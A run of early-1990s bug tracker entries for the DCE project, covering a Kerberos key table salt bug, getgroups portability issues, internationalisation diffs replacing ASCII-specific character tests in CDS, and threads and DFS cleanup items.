Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/18/93 public]
Should be able to get name for name_cache with less overhead than the current
call to sec_login_export_context from sec_login_pvt_get_namecache



CR Number                     : 7155
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : key_mgmt
Short Description             : seckey_set always uses default salt.
Reported Date                 : 2/8/93
Found in Baseline             : 1.0.2
Found Date                    : 2/8/93
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/8/93 public]

security/client/key_mgmt/seckey_set.c always uses the default salt rather
than the one passed in to the routine.

This means that if you attempt to set the key in a keytable for a principal
which has been renamed since the last time its password was changed, the
wrong thing will happen.

This will probably require some changes to rgy_edit to set the salt
correctly in the incoming request.

[9/30/93 public]
Changing principal names isn't yet implemented, so this is moot for 1.0.3.

[10/1/93 public]
Oops, that's account rename; pgo rename is implemented, so undeferred.

[10/20/93 public]

This bug manifests itself when an administrator changes a
principal name and then attempts to use the ktadd command
to add the principal to a keytable.  The ktadd will
complete successfully, but the key in the keytable will
not match the renamed principal's current key in the 
security server (because the salt stored at the server is no 
longer the default).  Attempts to either perform a login, or
decrypt service tickets using the key in the keytable will fail.

The workaround for this is to change the principal's password
(thereby assuring that the salt for the principal's current
key is once again the default salt) before attempting the ktadd.  

The mechanism for fixing this using currently available internal
API's (namely the krb5 library) would break when 1.1 
preauthentication is implemented.  A proper fix requires a new 
API call that will be available in 1.1.

Given the shortness of time and the availabilty of a workaround,
I'm dropping the priority and deferring this bug to 1.1.



CR Number                     : 7146
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : 
Short Description             : krb5_cc_match() cleanup
Reported Date                 : 2/5/93
Found in Baseline             : 1.0.2
Found Date                    : 2/5/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/5/93 public]

krb5_cc_match was broken out of krb5_fcc_retrieve very late in 1.0.2 to
make it easier to write alternative credential cache managers.

krb5_cc_match should move out of krb5/lib/file/ccache/fcc_retrv.c and into a
file/ccache/*.c module.

There should be a prototype for it in krb5/include/krb5/ccache.h

This is a code cleanup issue.

[2/5/93 public]
excuse me, this should be an enhancement..



CR Number                     : 7145
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : sec_id_gen_name should use name cache.
Reported Date                 : 2/5/93
Found in Baseline             : 1.0.2
Found Date                    : 2/5/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/5/93 public]

sec_id_gen_name should use the name cache to do uuid->string mapping.

also, sec_id_parse_name should always ask for the cell uuid if it also asks
for the pgo uuid.



CR Number                     : 7130
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : cma_config
Short Description             : cma_config enumerations should not overlap.
Reported Date                 : 2/4/93
Found in Baseline             : 1.0.2
Found Date                    : 2/4/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : threads/cma_config.h
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/4/93 public]

There are about a half dozen different explicit enumerations in
cma_config.h which "overlap" in their range.

Since there's no type checking in the preprocessor it might make sense to
split these up into different ranges.. e.g., 100001..100004 for UNIX_TYPE,
200001..200004 for VENDOR, 300001..300004 for PLATFORM, etc.

This change should be limited in scope to this one module.



CR Number                     : 7112
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : spurious comparison with zero
Reported Date                 : 2/3/93
Found in Baseline             : 1.0.2
Found Date                    : 2/3/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[2/3/93 public]
In epiv_VerifyVolume, epia_GetInfo is called and the result is compared with
zero, but the result of the comparison is thrown away.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[6/20/94 public]



CR Number                     : 7110
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : cma_signal
Short Description             : should not put in default handler if !_CMA_PROTECT_MEMORYU_
Reported Date                 : 2/3/93
Found in Baseline             : 1.0.2
Found Date                    : 2/3/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/3/93 public]

There are two reasons for estabilishing the cma___sig_sync_kill handler:
 - to vector signals to the appropriate per-thread handler
 - to remap the stack guard pages prior to inducing a core dump.

The latter is a no-op on systems where _CMA_PROTECT_MEMORY_ is zero.
In most cases, the former is a no-op.

Post-mortem core dumps on RIOS and HPUX would be easier to diagnose if
cma___sig_sync_kill were not set up until *after* the application asked for
a signal handler.

(yes, I realize that there is an interaction with exception handlers here).



CR Number                     : 7101
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : security/client/acl/dfs_dce_acl.c
Short Description             : NGROUPS, getgroups() and errno problem
Reported Date                 : 2/3/93
Found in Baseline             : 1.0.1
Found Date                    : 2/3/93
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/3/93 public]

NGROUPS is not defined in the include files included by dfs_dce_acl.c.
And getgroups() is not called according to the POSIX.1 conventions.
POSIX (as does SunOS and System V) defines getgroups() to take an
integer listing the size of the group array, not a pointer to an
integer.

POSIX.1 does not define NGROUPS, rather it defines NGROUPS_MAX,
which may be found in <limits.h>. To get NGROUPS, one has to include
<sys/param.h>

Also, the code include <sys/errno.h> instead of <errno.h>. According to the
man page (of osf/1 and Sun), the right way is to include <errno.h>.

Diff follows:

*** dfs_dce_acl.c       Wed Feb  3 10:09:45 1993
--- dfs_dce_acl.c.orig  Fri Jul 31 15:24:07 1992
***************
*** 37,45 ****
  #include <sys/types.h>
  #include <sys/file.h>
  #include <sys/stat.h>
- #include <sys/param.h>
  
! #include <errno.h>
  #include <dce/dce_cf.h>
  #include <dce/id_base.h>
  #include <dce/binding.h>
--- 37,44 ----
  #include <sys/types.h>
  #include <sys/file.h>
  #include <sys/stat.h>
  
! #include <sys/errno.h>
  #include <dce/dce_cf.h>
  #include <dce/id_base.h>
  #include <dce/binding.h>
***************
*** 483,489 ****
  {
    uid_t                               localUid;
    gid_t                               localGid;
!   int                         gidsetlen=NGROUPS;
    gid_t                               gidset[NGROUPS];
    int                         i;
    uuid_t                      realmUuid;
--- 482,488 ----
  {
    uid_t                               localUid;
    gid_t                               localGid;
!   int                         gidsetlen;
    gid_t                               gidset[NGROUPS];
    int                         i;
    uuid_t                      realmUuid;
***************
*** 527,533 ****
        bcopy((char *)&localUid, (char *)&(pacP->principal.uuid), sizeof(localUid));
        bcopy((char *)&localGid, (char *)&(pacP->group.uuid), sizeof(localGid));        
!       pacP->num_groups = getgroups(gidsetlen, gidset);
        pacP->groups = (sec_id_t *)malloc(pacP->num_groups * sizeof(sec_id_t));
        bzero((char *)pacP->groups, pacP->num_groups * sizeof(sec_id_t));
        for (i = 0; i < pacP->num_groups; i++) {
--- 526,532 ----
        bcopy((char *)&localUid, (char *)&(pacP->principal.uuid), sizeof(localUid));
        bcopy((char *)&localGid, (char *)&(pacP->group.uuid), sizeof(localGid));        
!       pacP->num_groups = getgroups(&gidsetlen, gidset);
        pacP->groups = (sec_id_t *)malloc(pacP->num_groups * sizeof(sec_id_t));
        bzero((char *)pacP->groups, pacP->num_groups * sizeof(sec_id_t));
        for (i = 0; i < pacP->num_groups; i++) {

[2/26/93 public]
Since this is not affecting any of the reference platforms, I'm downgrading it
from severity 'B' (Critical - no workaround) to 'D' (Significant - an
acceptable workaround), since it's not going to get past the DRB for this
release anyway.  Assigned it to myself...

[8/2/93 public]

Fixed as part of code cleanup for 1.1.  Changed to enhancement.



CR Number                     : 7082
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : CDS code cleanup - towars I18N
code set independence
Reported Date                 : 2/1/93
Found in Baseline             : 1.0.1
Found Date                    : 2/1/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
cds/control/prscmd.c,islatin1print.c,msg.c,prs.c,msgfnd.c cds/includes/msgpre.h cds/library/dnsenumobj.c,dnsenumgrp.cdnsemumslink.c,dnsenumchild.c,dnscreategrp.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/1/93 public]

This report details the CDS problems described in the document
"I18N Code Set Independence for MVS/PP Release 1.1.0" written
by Suman Kalia, Sue Kline and David Obermann dated November 13,
1992.  A solution is provided along with each problem.  These
solutions were used for DCE on MVS.

Most of the recommended changes are a case of substituting a
character testing or manipulation function (e.g to_upper(),
to_lower(), isdigit(), isxdigit(), isalpha(), isupper(), islower(),
isprint(), isalnum, ispunt, iscntrl(), isspace() ) for adhoc character
testing or manipulation which is known to be dependent on the ascii
encoding. 

Proposed Improvement:

*** /project/dce/build/dce1.0.2/src/directory/cds/control/islatin1print.c
Wed Dec 30 08:14:35 1992
--- islatin1print.c	Fri Jan 29 15:25:38 1993
***************
*** 43,47 ****
  islatin1print (c)
  	unsigned char	c;		/* true if char is latin1 printable
*/
      {
!     return(((c>31)&&(c<127))||(c>159) ? 1 : 0 );
      }
--- 43,47 ----
  islatin1print (c)
  	unsigned char	c;		/* true if char is latin1 printable
*/
      {
!     return( isprint(c) ? 1 : 0 );
      }
*** /project/dce/build/dce1.0.2/src/directory/cds/control/msg.c	Wed Dec 30
08:14:59 1992
--- msg.c	Fri Jan 29 15:33:21 1993
***************
*** 1009,1015 ****
  register char	cc;
  
  {
!     if (cc >= 'a' && cc <= 'z')  cc &= 0337;
      return (cc);
  }
  
--- 1009,1015 ----
  register char	cc;
  
  {
!     if (islower(cc)) cc = toupper(cc);
      return (cc);
  }
*** /project/dce/build/dce1.0.2/src/directory/cds/control/prs.c	Wed Dec 30
08:15:51 1992
--- prs.c	Fri Jan 29 16:57:40 1993
***************
*** 2656,2662 ****
  register char	cc;
  
  {
!     if (cc >= 'a' && cc <= 'z')  return (cc &= 0xDF);
      return (cc);
  }
  
--- 2656,2662 ----
  register char	cc;
  
  {
!     if (islower(cc) cc = toupper(cc);
      return (cc);
  }
  
***************
*** 2726,2753 ****
      {
      	if (base == 8)
      	{
!     	    if ((*cp < '0') || (*cp > '7'))
      		break;
      	}
  
      	if (base == 10)
      	{
!     	    if ((*cp < '0') || (*cp > '9'))
      		break;
      	}
  
      	if (base == 16)
      	{
!     	    if ((*cp < '0') || (trn_upper(*cp) > 'F'))
      		break;
  
!     	    if ((*cp > '9') && (trn_upper(*cp) < 'A'))
!     		break;
! 
!     	    if (*cp > '9')
!     	    {
!     		*cp = trn_upper(*cp) - 'A' + '9' + 1;  
!     	    }
      	}
  
      	result *= base;
--- 2726,2748 ----
      {
      	if (base == 8)
      	{
!     	    if (!(isdigit(*cp) || (*cp == '8') || (*cp == '9'))
      		break;
      	}
  
      	if (base == 10)
      	{
!     	    if (!(isdigit(*cp)))
      		break;
      	}
  
      	if (base == 16)
      	{
!     	    if (!(isxdigit(*cp)))
      		break;
  
!     	    if (isalpha(*cp)) 
!     		*cp = toupper(*cp) - 'A' + '9' + 1;
      	}
  
      	result *= base;
***************
*** 3248,3255 ****
      	 * Do a user prompt type string.  This is a single string, and
      	 * letters are ALWAYS used alphabetically and in the exact case.
      	 */
!     	case 6:	if ( (*pnt0 < '0') || (trn_upper(*pnt0) > 'Z') ||
!     		    ((*pnt0 > '9') && (trn_upper(*pnt0) < 'A')) )
      		{
      		    pnt2 = pnt0++;
      		}
--- 3243,3249 ----
      	 * Do a user prompt type string.  This is a single string, and
      	 * letters are ALWAYS used alphabetically and in the exact case.
      	 */
!     	case 6:	if ( !(isalnum(*pnt0)) )
      		{
      		    pnt2 = pnt0++;
      		}
***************
*** 3347,3354 ****
      /*
       * Check for end of user's string
       */
!     if ( ((trn_upper(*str0) >= 'A') && (trn_upper(*str0) <= 'Z')) ||
! 	 ((*str0 >= '0')            && (*str0 <= '9')) )
      {
      	return (-1);
      }
--- 3341,3347 ----
      /*
       * Check for end of user's string
       */
!     if ( isalnum(*str0))
      {
      	return (-1);
      }
*** /project/dce/build/dce1.0.2/src/directory/cds/control/prscmd.c	Wed
Dec 30 08:15:57 1992
--- prscmd.c	Mon Feb  1 12:27:05 1993
***************
*** 96,101 ****
--- 96,102 ----
  #include <dns_cdefs.h>
  #include <dns_debug.h>
  #include <string.h>
+ #include <ctype.h>
  
  #ifdef vms
  #include <rms>
***************
*** 110,116 ****
  static int pr_wrk(), pr_vmatch(), pr_ltmatch(), pr_cmatch(), pr_wmatch();
  static int pr_call(), pr_exword(), pr_exbyte(), pr_ele(), pr_cha(),
pr_wor();
  static int pr_str(), pr_oct(), pr_dec(), pr_hex(), pr_gos(), pr_for();
! static int pr_exvalue(), pr_upper();
  static long pr_exlong();
  static char *pr_nonblank();
  
--- 111,117 ----
  static int pr_wrk(), pr_vmatch(), pr_ltmatch(), pr_cmatch(), pr_wmatch();
  static int pr_call(), pr_exword(), pr_exbyte(), pr_ele(), pr_cha(),
pr_wor();
  static int pr_str(), pr_oct(), pr_dec(), pr_hex(), pr_gos(), pr_for();
! static int pr_exvalue();
  static long pr_exlong();
  static char *pr_nonblank();
  
***************
*** 1383,1389 ****
       */
      if (base == 8)
      {
!     	while ((*work_element >= '0') && (*work_element <= '7'))
      	{
      	    context->num <<= 3;
      	    context->num  |= *work_element++ & 0x07;
--- 1384,1390 ----
       */
      if (base == 8)
      {
!     	while (isoctal(*work_element))
      	{
      	    context->num <<= 3;
      	    context->num  |= *work_element++ & 0x07;
***************
*** 1392,1398 ****
  
      if (base == 10)
      {
!     	while ((*work_element >= '0') && (*work_element <= '9'))
      	{
      	    context->num *= 10;
      	    context->num += *work_element++ & 0x0F;
--- 1393,1399 ----
  
      if (base == 10)
      {
!     	while (isdigit(*work_element))
      	{
      	    context->num *= 10;
      	    context->num += *work_element++ & 0x0F;
***************
*** 1401,1418 ****
  
      if (base == 16)
      {
!     	while ( ((*work_element >= '0') && (*work_element <= '9')) ||
!     	        ((*work_element >= 'A') && (*work_element <= 'F')) ||
!     	        ((*work_element >= 'a') && (*work_element <= 'f')) )
      	{
      	    context->num <<= 4;
!     	    if (*work_element < 'A')
      	    {
      		context->num |= *work_element++ & 0x0F;
      	    }
      	    else
      	    {
!     		context->num |= (pr_upper(*work_element++) & 0x0F) + 9;
      	    }
      	}
      }
--- 1402,1417 ----
  
      if (base == 16)
      {
!     	while (isxdigit(*work_element))
      	{
      	    context->num <<= 4;
!     	    if (isdigit(*work_element))
      	    {
      		context->num |= *work_element++ & 0x0F;
      	    }
      	    else
      	    {
!     		context->num |= (toupper(*work_element++) & 0x0F) + 9;
      	    }
      	}
      }
***************
*** 1608,1614 ****
       * string character in uppercase.
       */
      got_match = NO;
!     upper_char = pr_upper(*user_char);
  
      /*
       * Step through match list.
--- 1607,1613 ----
       * string character in uppercase.
       */
      got_match = NO;
!     upper_char = toupper(*user_char);
  
      /*
       * Step through match list.
***************
*** 1618,1624 ****
  	/*
      	 * If not alphabetic match, and is an alphabetic, do a "logical"
match.
      	 */
!     	if ((alpha_match == 0) && (*list_char >= 'A') && (*list_char <=
'Z'))
      	{
  	    switch (*list_char)
  	    {
--- 1617,1623 ----
  	/*
      	 * If not alphabetic match, and is an alphabetic, do a "logical"
match.
      	 */
!     	if ((alpha_match == 0) && (isupper(*list_char)))
      	{
  	    switch (*list_char)
  	    {
***************
*** 1626,1638 ****
  		 * Any alphabetic.
  		 */
  		case 'A':
! 			if ((upper_char >= 'A') && (upper_char <= 'Z'))
got_match = YES;
  			break;
  		/*
  		 * Decimal digit.
  		 */
  		case 'D':
! 			if ((*user_char >= '0') && (*user_char <= '9'))
got_match = YES;
      			break;
  		/*
  		 * End-of-line (with spaces).
--- 1625,1637 ----
  		 * Any alphabetic.
  		 */
  		case 'A':
! 			if (isalpha(*user_char)) got_match = YES;
  			break;
  		/*
  		 * Decimal digit.
  		 */
  		case 'D':
! 			if (isdigit(*user_char)) got_match = YES;
      			break;
  		/*
  		 * End-of-line (with spaces).
***************
*** 1644,1690 ****
  		 * Hexadecimal digit.
  		 */
  		case 'H':
! 			if ((*user_char >= '0') && (*user_char <= '9'))
got_match = YES;
!     			if ((upper_char >= 'A') && (upper_char <= 'F'))
got_match = YES;
      			break;
  		/*
  		 * Lowercase alphabetic.
  		 */
  		case 'L':
! 			if ((*user_char >= 'a') && (*user_char <= 'z'))
got_match = YES;
      			break;
  		/*
  		 * Not white space.
  		 */
  		case 'N':
! 			if (upper_char > ' ') got_match = YES;
      			break;
  		/*
  		 * Octal digit.
  		 */
  		case 'O':
! 			if ((*user_char >= '0') && (*user_char <= '7'))
got_match = YES;
      			break;
  		/*
  		 * Punctuation.
  		 */
  		case 'P':
! 			if ((*user_char > ' ') && (*user_char < '0'))
got_match = YES;
!     			if ((*user_char > '9') && (*user_char < 'A'))
got_match = YES;
!     			if ((*user_char > 'Z') && (*user_char < 'a'))
got_match = YES;
!     			if ((*user_char > 'z') && (*user_char < DEL))
got_match = YES;
      			break;
  		/*
  		 * White space.
  		 */
  		case 'S':
! 			if ((*user_char <= ' ') && (*user_char > '\0'))
got_match = YES;
      			break;
  		/*
  		 * Uppercase alphabetic.
  		 */
  		case 'U':
! 			if ((*user_char >= 'A') && (*user_char <= 'Z'))
got_match = YES;
      			break;
  		/*
  		 * Any character but EOL.
--- 1643,1686 ----
  		 * Hexadecimal digit.
  		 */
  		case 'H':
! 			if (isxdigit(*user_char)) got_match = YES;
      			break;
  		/*
  		 * Lowercase alphabetic.
  		 */
  		case 'L':
! 			if (islower(*user_char)) got_match = YES;
      			break;
  		/*
  		 * Not white space.
  		 */
  		case 'N':
! 			if (isgraph(*user_char)) got_match = YES;
      			break;
  		/*
  		 * Octal digit.
  		 */
  		case 'O':
! 			if (isoctal(*user_char)) got_match = YES;
      			break;
  		/*
  		 * Punctuation.
  		 */
  		case 'P':
! 			if (ispunct(*user_char)) got_match = YES;
      			break;
  		/*
  		 * White space.
  		 */
  		case 'S':
!                         if (((iscntrl(*string)) && (*string != '\0')) ||
isspace(*string))
! 			    got_match = YES;
      			break;
  		/*
  		 * Uppercase alphabetic.
  		 */
  		case 'U':
! 			if (isupper(*user_char)) got_match = YES;
      			break;
  		/*
  		 * Any character but EOL.
***************
*** 1816,1822 ****
  	 */
  	 if (case_match == 0)
  	{
! 	    if (pr_upper(*user_char) != pr_exbyte(list_char))
  	    {
  		endword = 0;
  		break;
--- 1812,1818 ----
  	 */
  	 if (case_match == 0)
  	{
! 	    if (toupper(*user_char) != pr_exbyte(list_char))
  	    {
  		endword = 0;
  		break;
***************
*** 2074,2104 ****
  }
  
  /*
-  * pr_upper ***
-  *
-  * Convert a character to uppercase
-  *
-  * Inputs:
-  *	character = "char" to convert.
-  *
-  * Outputs:
-  *      "int" character value, in uppercase if was lowercase alphabetic.
-  */
- 
- static int pr_upper(character)
- 
- register char character;
- 
- {
-     register int result;
- 
-     if ((character >= 'a') && (character <= 'z')) result = character &
0337;
-     else                                          result = character &
0377;
- 
-     return (result);
- }
- 
- /*
   * pr_nonblank ***
   *
   * Find the next non-blank character.
--- 2070,2075 ----
***************
*** 2116,2122 ****
  register char *string;
  
  {
!     while ((*string <= ' ') && (*string > '\0')) string++;
      return (string);
  }
  
--- 2087,2098 ----
  register char *string;
  
  {
!     while (((iscntrl(*string)) && (*string != '\0')) || isspace(*string))
string++;
      return (string);
  }
  
+ static int isoctal(c)
+ unsigned char c;
+ {
+ return ( isdigit(c) && (c != '8') && (c != '9') ? 1 : 0 );
+ }

-----------------------------------
In the file, directory/cds/includes/msgpre.h
some record processing literals, are assigned character
codes, which map to commonly used EBCDIC characters. This caused a
problem in the port to EBCDIC, which was overcome by mapping these
characters to a range which would not cause problems for EBCDIC,
but which probably cause trouble for some other code set.

Solution used for MVS:

        #define REC_ELE         (char)0xB0      /* ELEMENT record */
        #define REC_CHA         (char)0xB1      /* CHARACTER test */
        #define REC_WOR         (char)0xB2      /* WORD test */
        #define REC_STR         (char)0xB3      /* STRING test */
        #define REC_OCT         (char)0xB4      /* OCTAL test */
        #define REC_DEC         (char)0xB5      /* DECIMAL test */
        #define REC_HEX         (char)0xB6      /* HEXADECIMAL test */
        #define REC_GOS         (char)0xB7      /* GOSUB test */
        #define REC_FOR         (char)0xB8      /* FORCE test */
        #define REC_EOF         (char)0xBF      /* End of file */

It was acknowledged that a much better solution would be to use regular
expressions and locales to define and detect these control codes.
-------------------
In the file directory/cds/control/msgfnd.c, it was noted that
there were statements which embeded the ASCII numberic character code
for the HORIZONTAL TAB character.

For MVS, this problem was fixed by adding encoding specific definitions
for the literal HOR_TAB_CHAR to the file msgpre.h, and then this literal
was used to replace the '\011' appearing in msgfnd.c.

        Add the following code to header file msgpre.h

        #if defined(SAA) && defined(EBCDIC)     /*          */
        #define   HOR_TAB_CHAR     '\005'       /* EBCDIC   */
        #else                                   /*          */
        #define   HOR_TAB_CHAR     '\011'       /* ASCII    */
        #endif                                  /*          */

The HOR_TAB_CHAR literal was than employed in the following changes 
to msgfnd.c

*** /project/dce/build/dce1.0.2/src/directory/cds/control/msgfnd.c	Wed
Dec 30 08:15:06 1992
--- msgfnd.c	Mon Feb  1 13:32:38 1993
***************
*** 89,94 ****
--- 89,95 ----
  #include <stdio.h>
  #include <msgpre.h>
  #include <msgblk.h>
+ #include <ctype.h>
  
  /*
   * Buffer containing NULL string.
***************
*** 158,164 ****
       */
      if (key_pnt != MS_NEXT)
      {
!         while ( (*key_pnt == ' ') || (*key_pnt == '\011') )
          {
      	    key_pnt++;
          }
--- 159,165 ----
       */
      if (key_pnt != MS_NEXT)
      {
!         while ( (*key_pnt == ' ') || (*key_pnt == HOR_TAB_CHAR ) )
          {
      	    key_pnt++;
          }
***************
*** 167,173 ****
          key_end = key_pnt;
          while (*pntx != '\0')
          {
!     	    if ( (*pntx != ' ') && (*pntx != '\011') )
      		key_end = ++pntx;
      	    else
      		++pntx;
--- 168,174 ----
          key_end = key_pnt;
          while (*pntx != '\0')
          {
!     	    if ( (*pntx != ' ') && (*pntx != HOR_TAB_CHAR) )
      		key_end = ++pntx;
      	    else
      		++pntx;
***************
*** 256,270 ****
  		/*
  		 * Make sure character is uppercase.
  		 */
! 		if ((*pntx >= 'a') && (*pntx <= 'z'))
! 		    chrx = *pntx++ & 0337;
  		else
! 		    chrx = *pntx++;
  
  		/*
  		 * Convert tabs to spaces
  		 */
! 		if (chrx == '\011')
  		    chrx = ' ';
  
  		/*
--- 257,273 ----
  		/*
  		 * Make sure character is uppercase.
  		 */
! 		if (islower(*pntx))
! 		    chrx = toupper(*pntx);
  		else
! 		    chrx = *pntx;
  
+                 pntx++;
+ 
  		/*
  		 * Convert tabs to spaces
  		 */
! 		if (chrx == HOR_TAB_CHAR)
  		    chrx = ' ';
  
  		/*
***************
*** 273,279 ****
  		if (chrx == ' ')
  		{
  		    while ( (pntx != key_end) &&
! 			((*pntx == ' ') || (*pntx == '\011')) )
  		    {
  			pntx++;
  		    }
--- 276,282 ----
  		if (chrx == ' ')
  		{
  		    while ( (pntx != key_end) &&
! 			((*pntx == ' ') || (*pntx == HOR_TAB_CHAR)) )
  		    {
  			pntx++;
  		    }
-------------------
        section 4.1 - IBM DCE 1.1 paper
        2.4.2 Category b) Problems
        -  CDSPI - Default values for optional parameters


        Default values for optional parameters to the CDSPI calls,
        which happen to be opaque data structures, are stored in
        static variables in the source files. These static variables
        are initialized with character strings which represent the
        memory map of the opaque structures. For example for dnsEnumObj,
        the default values for name and class filter are defined as :

        static byte_t allNamesY" = {"\11\1*"};
        static byte_t allClassesY" = {"\11\1*"};

        When this code is compiled on an EBCDIC platform, the third
        byte in the array allNames will contain the EBCDIC value of
        the character "*" which is x'5C' . This corresponds to the
        ASCII char "-".


        Since in DCE 1.0  all names are stored ONLY in ASCII
        8859-1 code page, when an MVS client sends an enumerate
        object request to a CDS server on AIX none of the names
        match the name filter and empty set of results is returned.
        This problem can be demonstrated by using the cdscp show
        command (without specifying any Name or class filter)
        on a non-ASCII system to enumerate objects in a
        clearinghouse stored on AIX server.

        This problem of "hard-coded" character data in source
        code occurs in the following source modules:

            src/directory/cds/library/dnsenumobj.c
            src/directory/cds/library/dnsenumgrp.c
            src/directory/cds/library/dnsenumslink.c
            src/directory/cds/library/dnsenumchild.c
            src/directory/cds/library/dnscreategrp.c


        Solution :

        Instead of hard coding the binary values for default parameters,
        the opaque data structures for optional parameters should be
        derived by calling standard CDS function calls to convert
        string form of names to the opaque format.

        Eg. allNames = cds_simpletoopq("*", .....)



CR Number                     : 7067
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : osf1
Component Name                : thr
Subcomponent Name             : 
Short Description             : use correct i386 macros
Reported Date                 : 1/29/93
Found in Baseline             : 1.0.1
Found Date                    : 1/29/93
Severity                      : D
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/29/93 public]
All DCE header files should include the definition:

    if defined(i386) || defined(__i386__)

instead of merely saying
    ifdef i386 
or
    if defined(i386)
etc

because the gcc compiler on OSF/1 1.1 has changed to adopt the new
standard in that all internally set macros names now has '__' as
its prefix and suffix.

This is needed for the DME project.

[1/29/93 public]
The fix should be to change the #ifdef to the right value, not just add
another value.  There is an easy work-around (severity A?) to this by using
CENV=-Di386 in the build environment if your compiler doesn't define it.

I'm curious as to which DCE files have this problem.  Also are these
conditionalized sections of code dependent on it being a 386 or on being
OSF/1?  There are no headers in the install tree that mention i386 and
there is only one header in the export tree that does and that's asn1.h.
Is this only a problem with headers?  Why not with .c files?

I've changed this to an enhancement since i386 is not a supported reference
platform.  Also I changed the severity to D since there is a very simple
work-around.  

Well, I also did a grep of the 1.0.2 backing tree and found 3 references to
i386 in only two files (decnet_types.h and asn1.h).  So I imagine that this
bug report is not intended toward our code.

[03/30/94 public]
I don't think we have a problem with this anymore.
Canceled.

[3/30/94 public]

Now at: /project/dce/build/dce1.1/export/hp800/usr/include/dce

absolut include/dce$ gegrep [^_]i386 *.h
cma_config.h:#  ifdef i386
exc_handling.h:#  if defined(i386)
absolut include/dce$ 

Yes, code cleanup should fix this.  I just don't see the need to cancel a
bug before all occurances have been fixed :-)

[03/30/94 public]
Well, if you are going to open it up, you have to take resonsibility
for getting it fixed.  Don't punt the problem on to my lap!

[3/30/94 public]
Sorry, tom, I did change it to "cma" I forgot to change resp. enginneer.
And it don't have to be me, there is no rule that if you open it you have
to be the one to fix it.  :-)

[3/30/94 public]
Its a threads bug that will be fixed by code cleanup. I've assigned it 
to myself.



CR Number                     : 7042
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 6874
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : deleting large sparse volume is VERY slow
Reported Date                 : 1/28/93
Found in Baseline             : 1.0.2
Found Date                    : 1/28/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[1/28/93 public]
In ota-ot6874-test-very-large-indexes I added the capability to test
very large volumes.  What I didn't notice at the time was that this
added about a minute to the execution time of basic.test (from 0:30 to
1:30).  All this time now appears to be in delete volume even thought
the volume only contains 5 files at file numbers 9, 99, 999, 9999, and
99999 (plus the volume root.  I suspect I have some unexpected N^2 loops
in there.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
